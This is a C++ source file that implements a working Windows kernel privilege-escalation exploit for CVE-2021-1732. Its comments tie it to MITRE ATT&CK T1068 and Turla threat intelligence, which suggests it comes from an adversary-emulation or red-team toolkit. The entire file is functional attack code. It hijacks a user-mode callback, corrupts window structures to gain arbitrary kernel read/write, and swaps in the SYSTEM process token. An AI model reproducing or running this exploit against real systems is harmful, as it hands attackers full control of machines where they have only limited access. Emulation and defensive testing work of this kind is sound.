/*
 * privesc.cpp:
 *      About:
 *          Perform the CVE-2021-1732 exploit to run a given function as SYSTEM.
 *      Result:
 *          Obtain SYSTEM privileges.
 *      MITRE ATT&CK Techniques:
 *          T1068: Exploitation for Privilege Escalation
 *      CTI:
 *          Turla has performed exploits in the past for privilege escalation: https://www.virusbulletin.com/virusbulletin/2014/05/anatomy-turla-exploits/
 *      Other References:
 *          https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2021/CVE-2021-1732.html
 *          https://github.com/oneoy/CVE-2021-1732-Exploit
 *          https://github.com/oneoy/CVE-2021-1732-Exploit/blob/main/ExploitTest/ExploitTest.cpp
 */

#include "privesc.hpp"

namespace privesc {

typedef void* (NTAPI* lHMValidateHandle)(HANDLE h, int type);
typedef DWORD64(NTAPI* fnxxxClientAllocWindowClassExtraBytes)(DWORD64* a1);
typedef DWORD64(NTAPI* fnNtUserConsoleControl)(int nConsoleCommand, HWND* pHwnd, int nConsoleInformationLength);
typedef DWORD64(NTAPI* fnNtCallbackReturn)(DWORD64* a1, DWORD64 a2, DWORD64 a3);
typedef DWORD64 QWORD;

#define _BYTE  uint8
#define _WORD  uint16
#define _DWORD uint32
#define _QWORD uint64

lHMValidateHandle g_pfnHmValidateHandle = NULL;
fnxxxClientAllocWindowClassExtraBytes g_oldxxxClientAllocWindowClassExtraBytes = NULL;
QWORD g_nRandom = 0;
QWORD g_qwExpLoit = 0;
QWORD ref_g_pMem5 = 0;
HWND g_hWndMax = 0;
QWORD g_qwrpdesk = 0;
bool g_bIsInit = 0;
DWORD g_pmbi_rcBar_left = 0;
DWORD g_offset_0x1 = 0;
QWORD g_qwMinBaseAddress = 0;
QWORD g_qwRegionSize = 0;
DWORD g_Thrdeskhead_cLockobj_Min = 0;
fnNtUserConsoleControl g_pfnNtUserConsoleControl = nullptr;
fnNtCallbackReturn g_pfnNtCallbackReturn = nullptr;

BOOL FindHMValidateHandle() {
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    if (hUser32 == NULL) {
        return FALSE;
    }

    BYTE* pIsMenu = (BYTE*)GetProcAddress(hUser32, "IsMenu");
    if (pIsMenu == NULL) {
        return FALSE;
    }
    unsigned int uiHMValidateHandleOffset = 0;
    for (unsigned int i = 0; i < 0x1000; i++) {
        BYTE* test = pIsMenu + i;
        if (*test == 0xE8) {
            uiHMValidateHandleOffset = i + 1;
            break;
        }
    }
    if (uiHMValidateHandleOffset == 0) {
        return FALSE;
    }

    unsigned int addr = *(unsigned int*)(pIsMenu + uiHMValidateHandleOffset);
    unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr;

    g_pfnHmValidateHandle = (lHMValidateHandle)((ULONG_PTR)hUser32 + offset + 11);
    return TRUE;
}


HWND GuessHwnd(QWORD* pBaseAddress, DWORD dwRegionSize) {
    QWORD qwBaseAddressBak = *pBaseAddress;
    QWORD qwBaseAddress = *pBaseAddress;
    DWORD dwRegionSizeBak = dwRegionSize;
    HWND hwndMagicWindow = nullptr;

    do {
        while (*(WORD*)qwBaseAddress != g_nRandom & dwRegionSize > 0) {
            qwBaseAddress += 2;
            dwRegionSize--;
        }

        if (*(DWORD*)((DWORD*)qwBaseAddress + (0x18 >> 2) - (0xc8 >> 2)) != 0x8000000) {
            qwBaseAddress = qwBaseAddress + 4;
            QWORD qwSub = qwBaseAddressBak - qwBaseAddress;
            dwRegionSize = dwRegionSizeBak + qwSub;
        }

        hwndMagicWindow = (HWND) * (DWORD*)(qwBaseAddress - 0xc8);

        if (hwndMagicWindow) {
            break;
        }

    } while (true);
    return hwndMagicWindow;
}


DWORD64 g_newxxxClientAllocWindowClassExtraBytes(DWORD64* a1) {
    DWORD64 dwTemp = *a1;

    if (dwTemp == g_nRandom) {
        g_offset_0x1 = 1;
        HWND hwndMagic = GuessHwnd(&g_qwMinBaseAddress, g_qwRegionSize);

        if (hwndMagic) {
            g_pfnNtUserConsoleControl(6i64, &hwndMagic, 0x10);
            //
            QWORD qwRet = g_Thrdeskhead_cLockobj_Min;
            g_pfnNtCallbackReturn(&qwRet, 24i64, 0i64);
        }
    }

    DWORD64 dwTest = *((PULONG64) * (a1 - 11));
    return g_oldxxxClientAllocWindowClassExtraBytes(a1);
}


LRESULT __fastcall MyWndProc(HWND a1, UINT a2, WPARAM a3, LPARAM a4) {
    if (a2 != 2) {
        return DefWindowProcW(a1, a2, a3, a4);
    }
    PostQuitMessage(0);
    return 0i64;
}


QWORD MyRead64(QWORD qwDestAddr) {
    MENUBARINFO pmbi = {};
    pmbi.cbSize = sizeof(MENUBARINFO);

    if (g_bIsInit) {

    }
    else {
        QWORD* pTemp = (QWORD*)LocalAlloc(0x40u, 0x200ui64);
        memset(pTemp, 0, 0x200);
        QWORD qwBase = 0x000000400000000;
        QWORD qwAdd = 0x0000000800000008;

        for (int i = 0; i < 0x40; i++) {
            *(pTemp + i) = qwBase + qwAdd * i;
        }

        *(QWORD*)ref_g_pMem5 = (QWORD)pTemp;
        GetMenuBarInfo(g_hWndMax, -3, 1, &pmbi);
        g_pmbi_rcBar_left = pmbi.rcBar.left;
        bool g_bIsInit = 1;
    }

    *(QWORD*)ref_g_pMem5 = qwDestAddr - g_pmbi_rcBar_left;
    GetMenuBarInfo(g_hWndMax, -3, 1, &pmbi);
    return (unsigned int)pmbi.rcBar.left + ((__int64)pmbi.rcBar.top << 32);
}

/*
 * run_elevated:
 *      About:
 *          Perform the CVE-2021-1732 exploit to run a given function as SYSTEM.
 *      Result:
 *          0 on success, otherwise some error code.
 *      MITRE ATT&CK Techniques:
 *          T1068: Exploitation for Privilege Escalation
 *      CTI:
 *          Turla has performed exploits in the past for privilege escalation: https://www.virusbulletin.com/virusbulletin/2014/05/anatomy-turla-exploits/
 *      Other References:
 *          https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2021/CVE-2021-1732.html
 *          https://github.com/oneoy/CVE-2021-1732-Exploit
 *          https://github.com/oneoy/CVE-2021-1732-Exploit/blob/main/ExploitTest/ExploitTest.cpp
 */
int elevate() {
    if (!FindHMValidateHandle()) {
        return 1;
    }

    g_pfnNtUserConsoleControl = (fnNtUserConsoleControl)GetProcAddress(GetModuleHandleA("win32u.dll"), "NtUserConsoleControl");
    g_pfnNtCallbackReturn = (fnNtCallbackReturn)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCallbackReturn");

    DWORD64 KernelCallbackTable = *(DWORD64*)(__readgsqword(0x60u) + 0x58);

    g_oldxxxClientAllocWindowClassExtraBytes = (fnxxxClientAllocWindowClassExtraBytes) * (DWORD64*)(KernelCallbackTable + 0x3D8);

    DWORD dwOldProtect;

    VirtualProtect((LPVOID)(KernelCallbackTable + 0x3D8), 0x300ui64, 0x40u, &dwOldProtect);
    *(DWORD64*)(KernelCallbackTable + 0x3D8) = (DWORD64)g_newxxxClientAllocWindowClassExtraBytes;
    VirtualProtect((LPVOID)(KernelCallbackTable + 0x3D8), 0x300ui64, dwOldProtect, &dwOldProtect);

    srand(time(0i64));
    g_nRandom = (rand() % 255 + 0x1234) | 1;

    WNDCLASSEXW wndClass = {};

    wndClass.lpfnWndProc = (WNDPROC)MyWndProc;
    wndClass.cbSize = 80;
    wndClass.style = 3;
    wndClass.cbClsExtra = 0;
    wndClass.cbWndExtra = 32;
    wndClass.hInstance = GetModuleHandleW(0i64);
    wndClass.lpszClassName = L"normalClass";
    ATOM g_lpWcxNormal = RegisterClassExW(&wndClass);

    wndClass.cbWndExtra = g_nRandom;
    wndClass.lpszClassName = L"magicClass";
    ATOM g_lpWcxMagic = RegisterClassExW(&wndClass);

    QWORD offset_0x2c = 0x2C;
    QWORD offset_0x28 = 0x28;
    QWORD offset_0x40 = 0x40;
    QWORD offset_0x44 = 0x44;
    QWORD offset_0x58 = 0x58;
    QWORD offset_0x128 = 0x128;
    QWORD offset_0xc8 = 0xc8;
    QWORD offset_0x18 = 0x18;
    QWORD offset_0x10 = 0x10;
    QWORD offset_0x220 = 0x220;
    QWORD offset_0x80 = 0x80;
    QWORD offset_0x98 = 0x98;
    QWORD offset_0x50 = 0x50;
    QWORD offset_0xe0 = 0xe0;

    QWORD offset_ActiveProcessLinks = 0x2F0;
    QWORD offset_InheritedFromUniqueProcessId = 0x3E8;
    QWORD offset_Token = 0x360;
    QWORD offset_UniqueProcessId = 0x2E8;

    CreatePopupMenu();

    QWORD g_pMem1 = (__int64)LocalAlloc(0x40u, 0x200ui64);
    QWORD g_pMem2 = (__int64)LocalAlloc(0x40u, 0x30ui64);
    QWORD g_pMem3 = (__int64)LocalAlloc(0x40u, 4ui64);
    QWORD g_pMem4 = (LONG_PTR)LocalAlloc(0x40u, 0xA0ui64);
    HLOCAL g_pMem5 = LocalAlloc(0x40u, 8ui64);

    DWORD* ref_g_pMem1 = (DWORD*)g_pMem1;
    QWORD ref_g_pMem2 = g_pMem2;
    QWORD ref_g_pMem3 = g_pMem3;
    QWORD ref_g_pMem4 = g_pMem4;
    ref_g_pMem5 = (__int64)g_pMem5;

    *(DWORD*)(g_pMem2 + offset_0x2c) = 16;
    *ref_g_pMem1 = 0x88888888;
    *(QWORD*)&ref_g_pMem1[2 * ((unsigned int)offset_0x28 >> 3)] = ref_g_pMem2;
    ref_g_pMem1[(unsigned __int64)(unsigned int)offset_0x40 >> 2] = 1;
    ref_g_pMem1[(unsigned __int64)(unsigned int)offset_0x44 >> 2] = 1;

    *(QWORD*)&ref_g_pMem1[2 * ((unsigned __int64)(unsigned int)offset_0x58 >> 3)] = (QWORD)g_pMem5;

    *(QWORD*)(ref_g_pMem3 + 8) = 16i64;

    *(QWORD*)ref_g_pMem3 = (QWORD)ref_g_pMem1;
    *(QWORD*)(ref_g_pMem4 + offset_0x98) = ref_g_pMem3;


    struct _MEMORY_BASIC_INFORMATION Buffer = {};

    Buffer.BaseAddress = 0i64;
    Buffer.AllocationBase = 0i64;
    *(QWORD*)&Buffer.AllocationProtect = 0i64;
    Buffer.RegionSize = 0i64;
    *(QWORD*)&Buffer.State = 0i64;
    *(QWORD*)&Buffer.Type = 0i64;

    __int64 nIndex = 0i64;
    __int64 nLoop = 10i64;

    QWORD Thrdeskhead_cLockObj1 = 0;
    QWORD Thrdeskhead_cLockObj2 = 0;

    QWORD arrEntryDesktop[10] = {};
    HWND arrhwndNoraml[10] = {};

    do {
        HWND hwndNormal = CreateWindowExW(
            0x8000000u,
            (LPCWSTR)(unsigned __int16)g_lpWcxNormal,
            L"somewnd",
            0x8000000u,
            0,
            0,
            0,
            0,
            0i64,
            CreateMenu(),
            GetModuleHandleW(0i64),
            0i64);

        arrhwndNoraml[nIndex] = hwndNormal;
        QWORD qwfirstEntryDesktop = (QWORD)g_pfnHmValidateHandle(hwndNormal, 1);
        arrEntryDesktop[nIndex] = qwfirstEntryDesktop;


        VirtualQuery((LPVOID)qwfirstEntryDesktop, &Buffer, 0x30ui64);


        if (g_qwMinBaseAddress == 0) {
            g_qwMinBaseAddress = (QWORD)Buffer.BaseAddress;
            g_qwRegionSize = (QWORD)Buffer.RegionSize;
        }
        else {
            if (g_qwMinBaseAddress < (QWORD)Buffer.BaseAddress) {

            }
            else {
                g_qwMinBaseAddress = (QWORD)Buffer.BaseAddress;
                g_qwRegionSize = (QWORD)Buffer.RegionSize;
            }
        }


        ++nIndex;
        --nLoop;
    } while (nLoop);


    Thrdeskhead_cLockObj1 = *(DWORD*)((char*)arrEntryDesktop[0] + 8);
    Thrdeskhead_cLockObj2 = *(DWORD*)((char*)arrEntryDesktop[1] + 8);

    HWND hWndMin = *(HWND*)((char*)arrhwndNoraml + (Thrdeskhead_cLockObj2 < Thrdeskhead_cLockObj1 ? 8 : 0));

    int nTemp = 0i64;
    if (Thrdeskhead_cLockObj1 <= Thrdeskhead_cLockObj2) {
        nTemp = 1i64;
    }
    g_hWndMax = arrhwndNoraml[nTemp];
    QWORD firstEntryDesktop_Max = arrEntryDesktop[nTemp];
    firstEntryDesktop_Max = arrEntryDesktop[nTemp];

    QWORD firstEntryDesktop_Min = *(__int64*)((char*)arrEntryDesktop + (Thrdeskhead_cLockObj2 < Thrdeskhead_cLockObj1 ? 8 : 0));

    g_Thrdeskhead_cLockobj_Min = *(DWORD*)(firstEntryDesktop_Min + 8);
    DWORD Thrdeskhead_cLockboj_Max = *(DWORD*)((char*)firstEntryDesktop_Max + 8);
    for (int i = 2i64; i < 10; ++i) {
        DestroyWindow(arrhwndNoraml[i]);
    }

    g_pfnNtUserConsoleControl(6i64, &hWndMin, 0x10);

    DWORD tagWndMin_offset_0x128 = *(DWORD*)(firstEntryDesktop_Min + offset_0x128);
    DWORD tagWndMax_offset_0x128 = *(QWORD*)(firstEntryDesktop_Max + offset_0x128);

    HWND g_hWndMagic = CreateWindowExW(
        0x8000000u,
        (LPCWSTR)(unsigned __int16)g_lpWcxMagic,
        L"somewnd",
        0x8000000u,
        0,
        0,
        0,
        0,
        0i64,
        CreateMenu(),
        GetModuleHandleW(0i64),
        0i64);

    DWORD dwRet = SetWindowLongW(g_hWndMagic, offset_0x128, g_Thrdeskhead_cLockobj_Min);

    SetWindowLongW(g_hWndMagic, offset_0xc8, 0xFFFFFFF);

    g_qwrpdesk = *(QWORD*)(firstEntryDesktop_Max + offset_0x18);
    SetWindowLongPtrA(hWndMin, offset_0x18 + Thrdeskhead_cLockboj_Max - g_Thrdeskhead_cLockobj_Min, g_qwrpdesk ^ 0x4000000000000000i64);
    g_qwExpLoit = SetWindowLongPtrA(g_hWndMax, -12, g_pMem4);

    QWORD qwOffset = Thrdeskhead_cLockboj_Max - g_Thrdeskhead_cLockobj_Min;
    QWORD qwNewLong = g_qwExpLoit;
    SetWindowLongPtrA(hWndMin, offset_0x18 + Thrdeskhead_cLockboj_Max - g_Thrdeskhead_cLockobj_Min, g_qwrpdesk);

    QWORD qwFrist = MyRead64(g_qwExpLoit + offset_0x50);

    QWORD qwSecond = MyRead64(qwFrist + offset_0x18);

    QWORD qwThird = MyRead64(qwSecond + offset_0x80);

    QWORD qwFourth = MyRead64(qwFrist + offset_0x10);

    QWORD qwFifth = MyRead64(qwFourth);

    QWORD qwEprocess = MyRead64(qwFifth + offset_0x220);

    QWORD qwEprocessBak = qwEprocess;
    DWORD dwPidSelf = GetCurrentProcessId();
    QWORD dwSystemToken = 0;
    QWORD dwMyToken = 0;
    QWORD qwMyTokenAddr = 0;

    while (!dwSystemToken || !qwMyTokenAddr) {
        DWORD dwPidRead = MyRead64(qwEprocess + (unsigned int)offset_UniqueProcessId);
        if (dwPidRead == 4) {
        dwSystemToken = MyRead64(qwEprocess + (unsigned int)offset_Token);
        }
        if (dwPidRead == dwPidSelf) {
            qwMyTokenAddr = qwEprocess + (unsigned int)offset_Token;
        }
        qwEprocess = MyRead64(qwEprocess + (unsigned int)offset_ActiveProcessLinks) - (unsigned int)offset_ActiveProcessLinks;

        if (qwEprocessBak == qwEprocess) {
            break;
        }
    }

    SetWindowLongPtrA(hWndMin, Thrdeskhead_cLockboj_Max + offset_0x128 - g_Thrdeskhead_cLockobj_Min, qwMyTokenAddr);
    SetWindowLongPtrA(g_hWndMax, 0, dwSystemToken);

    SECURITY_ATTRIBUTES sa;
    HANDLE hRead, hWrite;
    byte buf[40960] = { 0 };
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    DWORD bytesRead;
    RtlSecureZeroMemory(&si, sizeof(si));
    RtlSecureZeroMemory(&pi, sizeof(pi));
    RtlSecureZeroMemory(&sa, sizeof(sa));
    int br = 0;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        return -3;
    }

    QWORD tagWndMagic = (QWORD)g_pfnHmValidateHandle(g_hWndMagic, 1i64);
    int nSizeofPointer = 8i64;
    QWORD qwcbwndExtra = *(QWORD*)(tagWndMagic + offset_0xe0) ^ 0x80000000000i64;

    SetWindowLongPtrA(hWndMin, offset_0x128 + Thrdeskhead_cLockboj_Max - g_Thrdeskhead_cLockobj_Min, qwThird + *(unsigned int*)(nSizeofPointer + tagWndMagic) + (unsigned int)offset_0x128);
    SetWindowLongPtrA(g_hWndMax, 0, 0i64);
    SetWindowLongPtrA(hWndMin, offset_0x128 + Thrdeskhead_cLockboj_Max - g_Thrdeskhead_cLockobj_Min, qwThird + *(unsigned int*)(nSizeofPointer + tagWndMagic) + (unsigned int)offset_0xe0);
    SetWindowLongPtrA(g_hWndMax, 0, qwcbwndExtra);

    SetWindowLongPtrA(hWndMin, offset_0x18 + Thrdeskhead_cLockboj_Max - g_Thrdeskhead_cLockobj_Min, g_qwrpdesk ^ 0x4000000000000000i64);
    SetWindowLongPtrA(g_hWndMax, -12, qwNewLong);

    SetWindowLongPtrA(hWndMin, offset_0x18 + Thrdeskhead_cLockboj_Max - g_Thrdeskhead_cLockobj_Min, g_qwrpdesk);
    SetWindowLongPtrA(hWndMin, offset_0x128 + Thrdeskhead_cLockboj_Max - g_Thrdeskhead_cLockobj_Min, tagWndMax_offset_0x128);
    SetWindowLongPtrA(hWndMin, offset_0x128, (unsigned int)tagWndMin_offset_0x128);

    return 0;
}

} //namespace privesc
